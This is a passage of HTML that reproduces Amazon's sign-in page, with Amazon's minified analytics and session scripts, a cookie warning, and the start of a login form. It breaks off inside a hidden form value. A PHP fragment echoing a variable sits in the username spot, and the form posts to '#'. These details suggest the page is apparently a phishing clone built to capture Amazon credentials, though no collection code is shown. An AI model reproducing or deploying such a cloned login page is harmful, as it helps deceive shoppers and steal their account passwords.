(function(l,d){function c(b){b="";var c=a.isBFT?"b":"s",d=""+a.oid,f=""+a.lid,g=d;d!=f&&20==f.length&&(c+="a",g+="-"+f);a.tabid&&(b=a.tabid+"+");b+=c+"-"+g;b!=e&&100>b.length&&(e=b,a.cookie?a.cookie.updateCsmHit(m,b+("|"+ +new Date)):document.cookie="csm-hit="+b+("|"+ +new Date)+n+"; path=/")}function p(){e=0}function h(b){!0===d[a.pageViz.propHid]?e=0:!1===d[a.pageViz.propHid]&&c({type:"visible"})}var n="; expires="+(new Date(+new Date+6048E5)).toGMTString(),m="tb",e,a=l.ue||{},k=a.pageViz&&a.pageViz.event&&
a.pageViz.propHid;a.attach&&(a.attach("click",c),a.attach("keyup",c),k||(a.attach("focus",c),a.attach("blur",p)),k&&(a.attach(a.pageViz.event,h,d),h({})));a.aftb=1})(ue_csm,document);


ue_csm.ue.stub(ue,"impression");


ue.stub(ue,"trigger");



if(window.ue&&uet) { uet('bb'); }

}
</script></head>

  <body class="ap-locale-en_US a-m-us a-aui_72554-c a-aui_mm_desktop_exp_291916-c a-aui_mm_desktop_launch_291918-c a-aui_mm_desktop_targeted_exp_291928-c a-aui_mm_desktop_targeted_launch_291922-c a-aui_pci_risk_banner_210084-c a-aui_perf_130093-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_tnr_v2_180836-c a-meter-animate">

<script>
!function(){function n(n,t){var r=i(n);return t&&(r=r("instance",t)),r}var r=[],c=0,i=function(t){return function(){var n=c++;return r.push([t,[].slice.call(arguments,0),n,{time:Date.now()}]),i(n)}};n._s=r,this.csa=n}();;
csa('Config', {});
if (window.csa) {
    csa("Config", {
        
        'Events.Namespace': 'csa',
        'ObfuscatedMarketplaceId': 'ATVPDKIKX0DER',
        'Events.SushiEndpoint': 'https://unagi.amazon.com/1/events/com.amazon.csm.csa.prod',
        'CacheDetection.RequestID': "GD8BTMZD2D0V8PWFQSXE",
        'CacheDetection.Callback': window.ue && ue.reset,
        'LCP.elementDedup': 1
    });

    csa("Events")("setEntity", {
        page: {requestId: "GD8BTMZD2D0V8PWFQSXE", meaningful: "interactive"},
        session: {id: "136-0636727-0142044"}
    });
}
!function(n){var i,r,o="splice",e=n.csa,u={},f={},c=n.csa._s,a=0,s={},g={},l={},h=setTimeout,d=Object.keys;function t(n,t){return e(n,t)}function v(n,t){var e=f[n]||{};O(e,t),f[n]=e,h(S,0)}function p(n,t,e){var i=!0;e&&e.buffered&&(i=(l[n]||[]).every(function(n){return!1!==t(n)})),i&&(s[n]||(s[n]=[]),s[n].push(t))}function m(n,t){if(n in g)t(g[n]);else{p(n,function(n){return t(n),!1})}}function b(n,t){if(e("Errors")("logError",n),u.DEBUG)throw t||n}function w(){return Math.abs(4294967295*Math.random()|0).toString(36)}function y(n,t){return function(){try{return n.apply(this,arguments)}catch(n){b(n.message||n,n)}}}function S(){for(var n=0;n<c.length;){var t=c[n],e=t[0]in f;if(!e&&!r)return void(a=t.length);e?(c[o](a=n,1),D(t)):n++}}function D(n){var arguments,t=f[n[0]],e=(arguments=n[1])[0];if(!t||!t[e])return b("Undefined function: "+t+"/"+e);i=n[3],f[n[2]]=t[e].apply(t,arguments.slice(1))||{},i=0}function E(){r=1,S()}function O(t,e){d(e).forEach(function(n){t[n]=e[n]})}m("$beforeunload",E),v("Config",{instance:function(n){O(u,n)}}),e.plugin=y(function(n){n(t)}),t.config=u,t.register=v,t.on=p,t.removeListener=function(n,t){var e=s[n];e&&e[o](e.indexOf(t),1)},t.once=m,t.emit=function(n,t,e){for(var i=s[n]||[],r=0;r<i.length;)!1===i[r](t)?i[o](r,1):r++;g[n]=t||{},e&&e.buffered&&(l[n]||(l[n]=[]),100<=l[n].length&&l[n].shift(),l[n].push(t||{}))},t.UUID=function(){return[w(),w(),w(),w()].join("-")},t.time=function(n){var t=i?new Date(i.time):new Date;return"ISO"===n?t.toISOString():t.getTime()},t.error=b,t.exec=y,(t.global=n).csa._s.push=function(n){n[0]in f&&(!c.length||r)?D(n):c[o](a++,0,n)},S(),h(function(){h(E,u.SkipMissingPluginsTimeout||5e3)},1)}("undefined"!=typeof window?window:global);csa.plugin(function(o){var t,n,r={},e="localStorage",c="sessionStorage",a="local",i="session",u=o.exec;function s(e,t){var n;try{r[t]=!!(n=o.global[e]),n=n||{}}catch(e){r[t]=!(n={})}return n}function f(){t=t||s(e,a),n=n||s(c,i)}function l(e){return e&&e[i]?n:t}o.store=u(function(e,t,n){f();var o=l(n);return e?t?void(o[e]=t):o[e]:Object.keys(o)}),o.storageSupport=u(function(){return f(),r}),o.deleteStored=u(function(e,t){f();var n=l(t);if("function"==typeof e)for(var o in n)n.hasOwnProperty(o)&&e(o,n[o])&&delete n[o];else delete n[e]})});csa.plugin(function(s){s.register("Errors",{logError:function(r){s("Metrics",{producerId:"csa",dimensions:{message:r}})("recordMetric","jsError",1)}})});csa.plugin(function(r){var o,e=r.global,i=r("Events"),d=e.location,f=e.document,a=((e.performance||{}).navigation||{}).type,t=e.addEventListener,s=r.emit,u={};function n(a,e){var t=!!o,n=(e=e||{}).keepPageAttributes;t&&(s("$beforePageTransition"),s("$pageTransition")),t&&!n&&i("removeEntity","page"),o=r.UUID(),n?u.id=o:u={schemaId:"<ns>.PageEntity.1",id:o,url:d.href,server:d.hostname,path:d.pathname,referrer:f.referrer,title:f.title},Object.keys(a||{}).forEach(function(e){u[e]=a[e]}),i("setEntity",{page:u}),s("$pageChange",u,{buffered:1}),t&&s("$afterPageTransition")}function g(){s("$load"),s("$ready"),s("$afterload")}function l(){s("$ready"),s("$beforeunload"),s("$unload"),s("$afterunload")}d&&f&&(t&&(t("beforeunload",l),t("pagehide",l),"complete"===f.readyState?g():t("load",g)),r.register("SPA",{newPage:n}),n({transitionType:{0:"hard",1:"refresh",2:"back-button"}[a]||"unknown"}))});csa.plugin(function(c){var t="Events",e="UNKNOWN",a="id",u="all",n="messageId",i="timestamp",f="producerId",o="application",r="obfuscatedMarketplaceId",s="entities",d="schemaId",l="version",p="attributes",v="<ns>",g=c.config,h=(c.global.location||{}).host,m=g[t+".Namespace"]||"csa_other",I=g.Application||"Other"+(h?":"+h:""),b=c("Transport"),y={},O=function(t,e){Object.keys(t).forEach(e)};function E(n,i,o){O(i,function(t){var e=o===u||(o||{})[t];t in n||(n[t]={version:1,id:i[t][a]||c.UUID()}),U(n[t],i[t],e)})}function U(e,n,i){O(n,function(t){!function(t,e,n){return"string"!=typeof e&&t!==l?c.error("Attribute is not of type string: "+t):!0===n||1===n||(t===a||!!~(n||[]).indexOf(t))}(t,n[t],i)||(e[t]=n[t])})}function N(o,t,r){O(t,function(t){var e=o[t];if(e[d]){var n={},i={};n[a]=e[a],n[f]=e[f]||r,n[d]=e[d],n[l]=e[l]++,n[p]=i,S(n),U(i,e,1),k(i),b("log",n)}})}function S(t){t[i]=function(t){return"number"==typeof t&&(t=new Date(t).toISOString()),t||c.time("ISO")}(t[i]),t[n]=t[n]||c.UUID(),t[o]=I,t[r]=g.ObfuscatedMarketplaceId||e,t[d]=t[d].replace(v,m)}function k(t){delete t[l],delete t[d],delete t[f]}function w(o){var r={};this.log=function(t,e){var n={},i=(e||{}).ent;return t?"string"!=typeof t[d]?c.error("A valid schema id is required for the event"):(S(t),E(n,y,i),E(n,r,i),E(n,t[s]||{},i),O(n,function(t){k(n[t])}),t[f]=o[f],t[s]=n,void b("log",t)):c.error("The event cannot be undefined")},this.setEntity=function(t){E(r,t,u),N(r,t,o[f])}}g["KillSwitch."+t]||c.register(t,{setEntity:function(t){E(y,t,u),N(y,t,"csa")},removeEntity:function(t){delete y[t]},instance:function(t){return new w(t)}})});csa.plugin(function(s){var c,l="Transport",d="post",u="preflight",r="csa.cajun.",i="store",a="deleteStored",n="addEventListener",f="sendBeacon",t=0,e=s.config[l+".BufferSize"]||2e3,g=s.config[l+".RetryDelay"]||1500,o=[],h=0,p=[],v=s.global,y=v.document,m=s.config[l+".FlushInterval"]||5e3,E=0;function T(n){if(864e5<s.time()-+new Date(n.timestamp))return s.error("Event is too old: "+n);h<e&&(o.push(n),h++,!E&&t&&(E=setTimeout(R,m)))}function R(){p.forEach(function(t){var e=[];o.forEach(function(n){t.accepts(n)&&e.push(n)}),e.length&&(t.chunks?t.chunks(e).forEach(function(n){S(t,n)}):S(t,e))}),o=[],E=0}function S(t,e){function o(){s[a](r+n)}var n=s.UUID();s[i](r+n,JSON.stringify(e)),[function(n,t,e){var o=v.navigator||{},r=v.cordova||{};if(!o[f]||!n[d])return 0;n[u]&&r&&"ios"===r.platformId&&!c&&((new Image).src=n[u]().url,c=1);var i=n[d](t);if(!i.type&&o[f](i.url,i.body))return e(),1},function(n,t,e){if(!n[d])return 0;var o=n[d](t),r=o.url,i=o.body,c=o.type,u=new XMLHttpRequest,a=0;function f(n,t,e){u.open("POST",n),e&&u.setRequestHeader("Content-Type",e),u.send(t)}return u.onload=function(){u.status<299?e():s.config[l+".XHRRetries"]&&a<3&&setTimeout(function(){f(r,i,c)},++a*g)},f(r,i,c),1}].some(function(n){try{return n(t,e,o)}catch(n){}})}s.once("$afterload",function(){t=1,function(e){(s[i]()||[]).forEach(function(n){if(!n.indexOf(r))try{var t=s[i](n);s[a](n),JSON.parse(t).forEach(e)}catch(n){s.error(n)}})}(T),y&&y[n]&&y[n]("visibilitychange",R,!1),R()}),s.once("$afterunload",function(){t=1,R()}),s.on("$afterPageTransition",function(){h=0}),s.register(l,{log:T,register:function(n){p.push(n)}})});csa.plugin(function(n){var r=n.config["Events.SushiEndpoint"];n("Transport")("register",{accepts:function(n){return n.schemaId},post:function(n){var t=n.map(function(n){return{data:n}});return{url:r,body:JSON.stringify({events:t})}},preflight:function(){var n,t=/\/\/(.*?)\//.exec(r);return t&&t[1]&&(n="https://"+t[1]+"/ping"),{url:n}},chunks:function(n){for(var t=[];500<n.length;)t.push(n.splice(0,500));return t.push(n),t}})});csa.plugin(function(n){var t,a,o,r,e=n.config,i="PageViews",d=e[i+".ImpressionMinimumTime"]||1e3,s="addEventListener",c="hidden",g="innerHeight",f="innerWidth",l="renderedTo",m=l+"Viewed",u=l+"Meaningful",v=l+"Impressed",h=1,p=2,P=3,T=4,w=5,y="loaded",I=7,E=8,S=n.global,V=n("Events",{producerId:"csa"}),$=S.document,b={},M={},C=w;if(!e["KillSwitch."+i]){if(!$||!$[s]||void 0===$[c])return K("PageStateChange.2",{state:"ignored"});W(),$[s]("visibilitychange",L,!1),$[s]("readystatechange",j,!1),n.on("$afterPageTransition",W),n.once("$load",j),n.on("$timing:loaded",j)}function H(e){if(!b[I]){var i;if(b[e]=n.time(),e!==P&&e!==y||(t=t||b[e]),t&&C===T)a=a||b[e],(i={})[u]=t-o,i[m]=a-o,K("PageView.4",i),r=r||setTimeout(R,d);if(e!==w&&e!==h&&e!==p||(clearTimeout(r),r=0),e!==h&&e!==p||K("PageRender.3",{transitionType:e===h?"hard":"soft"}),e===I)(i={})[u]=t-o,i[m]=a-o,i[v]=b[e]-o,K("PageImpressed.2",i)}}function K(e,i){M[e]||(i.schemaId="<ns>."+e,V("log",i,{ent:"all"}),M[e]=1)}function L(){0===S[g]&&0===S[f]?(C=E,n("Events")("setEntity",{page:{viewport:"hidden-iframe"}})):C=$[c]?w:T,H(C)}function R(){H(I),r=0}function W(){var e=o?p:h;b={},M={},a=t=0,o=n.time(),H(e),L()}function j(){var e=$.readyState;"interactive"===e&&H(P),"complete"===e&&H(y)}});csa.plugin(function(c){var s=5,e="click",t="addEventListener",r="touches",u="timeStamp",o="length",f="pageX",g="pageY",p="pageXOffset",d="pageYOffset",v=250,m=5,l=200,x=.5,n={capture:!0,passive:!0},X=c.global,Y=c.emit,h=X.Math.abs,a=(X.document||{}).documentElement||{},y={x:0,y:0,t:0,sX:0,sY:0},N={x:0,y:0,t:0,sX:0,sY:0};function b(t){if(t.id)return"//*[@id='"+t.id+"']";var e=function(t){var e,n=1;for(e=t.previousSibling;e;e=e.previousSibling)e.nodeName===t.nodeName&&(n+=1);return n}(t),n=t.nodeName;return 1!==e&&(n+="["+e+"]"),t.parentNode&&(n=b(t.parentNode)+"/"+n),n}function E(t,e,n){var a=c("Content",{target:n}),i={schemaId:"<ns>.ContentInteraction.1",interaction:t,interactionData:e,messageId:c.UUID()};if(n){var r=b(n);r&&(i.attribution=r);var o=function(t){for(var e=t,n=e.tagName,a=!1,i=0;i<s;i++){if(!e||!e.parentElement){a=!0;break}n=(e=e.parentElement).tagName+"/"+n}return a||(n=".../"+n),n}(n);o&&(i.interactionData.parentChain=o)}a("log",i),Y("$content.interaction",i)}function i(t){E(e,{interactionX:""+t.pageX,interactionY:""+t.pageY},t.target)}function I(t){if(t&&t[r]&&1===t[r][o]){var e=t[r][0];N=y={e:t.target,x:e[f],y:e[g],t:t[u],sX:X[p],sY:X[d]}}}function C(t){if(t&&t[r]&&1===t[r][o]&&y&&N){var e=t[r][0],n=t[u],a=n-N.t,i={e:t.target,x:e[f],y:e[g],t:n,sX:X[p],sY:X[d]};N=i,l<=a&&(y=i)}}function D(t){if(t){var e=h(y.x-N.x),n=h(y.y-N.y),a=h(y.sX-N.sX),i=h(y.sY-N.sY),r=t[u]-y.t;if(v<1e3*e/r&&m<e||v<1e3*n/r&&m<n){var o=n<e;o&&a&&e*x<=a||!o&&i&&n*x<=i||E((o?"horizontal":"vertical")+"-swipe",{interactionX:""+y.x,interactionY:""+y.y,endX:""+N.x,endY:""+N.y},y.e)}}}a[t](e,c.exec(i),n),a[t]("touchstart",c.exec(I),n),a[t]("touchmove",c.exec(C),n),a[t]("touchend",c.exec(D),n)});
</script>

<script type="text/javascript">

(function(){function l(a){for(var c=b.location.search.substring(1).split("&"),e=0;e<c.length;e++){var d=c[e].split("=");if(d[0]===a)return d[1]}}window.amzn=window.amzn||{};amzn.copilot=amzn.copilot||{};var b=window,f=document,g=b.P||b.AmazonUIPageJS,h=f.head||f.getElementsByTagName("head")[0],m=0,n=0;amzn.copilot.checkCoPilotSession=function(){f.cookie.match("cpidv")&&("undefined"!==typeof jQuery&&k(jQuery),g&&g.when&&g.when("jQuery").execute(function(a){k(a)}),b.amznJQ&&b.amznJQ.available&&b.amznJQ.available("jQuery",
function(){k(jQuery)}),b.jQuery||g||b.amznJQ||q())};var q=function(){m?b.ue&&"function"===typeof b.ue.count&&b.ue.count("cpJQUnavailable",1):(m=1,f.addEventListener?f.addEventListener("DOMContentLoaded",amzn.copilot.checkCoPilotSession,!1):f.attachEvent&&f.attachEvent("onreadystatechange",function(){"complete"===f.readyState&&amzn.copilot.checkCoPilotSession()}))},k=function(a){if(!n){n=1;amzn.copilot.jQuery=a;a=l("debugJS");var c="https:"===b.location.protocol?1:0,e=1;url="/gp/copilot/handlers/copilot_strings_resources.html";
window.texas&&texas.locations&&(url=texas.locations.makeUrl(url));g&&g.AUI_BUILD_DATE&&(e=0);amzn.copilot.jQuery.ajax&&amzn.copilot.jQuery.ajax({url:url,dataType:"json",data:{isDebug:a,isSecure:c,includeAUIP:e},success:function(a){amzn.copilot.vip=a.serviceEndPoint;amzn.copilot.enableMultipleTabSession=a.isFollowMe;r(a)},error:function(){b.ue.count("cpLoadResourceError",1)}})}},r=function(a){var c=amzn.copilot.jQuery,e=function(){amzn.copilot.setup(c.extend({isContinuedSession:!0},a))};a.CSSUrls&&
c.each(a.CSSUrls[0],function(a,c){var b=f.createElement("link");b.type="text/css";b.rel="stylesheet";b.href=c;h.appendChild(b)});a.CSSTag&&s(a.CSSTag);if(a.JSUrls){var d=l("forceSynchronousJS"),b=a.JSUrls[0];c.each(b,function(a,c){a===b.length-1?p(c,d,e):p(c,d)})}a.JSTag&&(t(a.JSTag),P.when("CSCoPilotPresenterAsset").execute(function(){e()}))},t=function(a){var c=f.createElement("div");c.innerHTML=a;a=0;for(var b=c.children.length;a<b;a++){var d=f.createElement("script");d.type="text/javascript";
d.innerHTML=c.children[a].innerHTML;h.appendChild(d)}},s=function(a){var b=f.createElement("div");b.innerHTML=a;a=0;for(var e=b.children.length;a<e;a++)h.appendChild(b.children[a])},p=function(a,b,e){var d=f.createElement("script");d.type="text/javascript";d.src=a;d.async=b?!1:!0;e&&(d.onload=e);h.appendChild(d)}})();

amzn.copilot.checkCoPilotSession();

</script>
<div id="a-page"><script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{"AUI_PRELOAD_261698":"C"}</script>
    <div class="a-section a-padding-medium auth-workflow">
      <div class="a-section a-spacing-none auth-navbar">
        





<div class="a-section a-spacing-medium a-text-center">
  
    

    
      


<a class="a-link-nav-icon" tabindex="-1" href="https://www.amazon.com/ref=ap_frn_logo">
  
  <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>

  
  
</a>

    
  
</div>


      </div>

      <div id="authportal-center-section" class="a-section">
        
          
          
            <div id="authportal-main-section" class="a-section">
              





<div class="a-section a-spacing-base auth-pagelet-container">
  
    
    
      <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning"><div class="a-box-inner a-alert-container"><h4 class="a-alert-heading">Please Enable Cookies to Continue</h4><i class="a-icon a-icon-alert"></i><div class="a-alert-content">
        <p>
          <a class="a-link-normal" href="https://www.amazon.com/gp/help/customer/display.html/ref=ap_cookie_error_help?">
            
          </a>
        </p>
      </div></div></div>
    
  
</div>

<div class="a-section auth-pagelet-container">
  








<div class="a-section a-spacing-base">
  <div class="a-box"><div class="a-box-inner a-padding-extra-large">

    <h1 class="a-spacing-small">
      Sign-In
    </h1>
    <!-- optional subheading element -->
    
    <div class="a-row a-spacing-base">
      <span><?php echo $u;?></span>
      <a id="ap_change_login_claim" class="a-link-normal" tabindex="6" href="https://www.amazon.com/ap/signin?showRememberMe=true&amp;openid.pape.max_auth_age=0&amp;openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;pageId=usflex&amp;openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fyour-account%3Fref_%3Dnav_ya_signin&amp;prevRID=GD8BTMZD2D0V8PWFQSXE&amp;openid.assoc_handle=usflex&amp;openid.mode=checkid_setup&amp;prepopulatedLoginId=eyJjaXBoZXIiOiJ5ZkhiK0ZTRnhhTDAyWGhlN0NIL1N3PT0iLCJ2ZXJzaW9uIjoxLCJJViI6IitWUCtzckFTbWhQdjNka1hPZjJkRnc9PSJ9&amp;failedSignInCount=0&amp;openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&amp;openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&amp;timestamp=1616435376000">
        Change
      </a>
    </div>

    
    

    

    <form method="post" novalidate="" action="#" class="auth-validate-form auth-real-time-validation a-spacing-none">
      <input type="hidden" name="appActionToken" value="m1KqGcdu25pwHGJXRCy1pZ54gyMj3D"><input type="hidden" name="appAction" value="SIGNIN_PWD_COLLECT">

      
      




  
    <input type="hidden" name="metadata1" value="ECdITeCs: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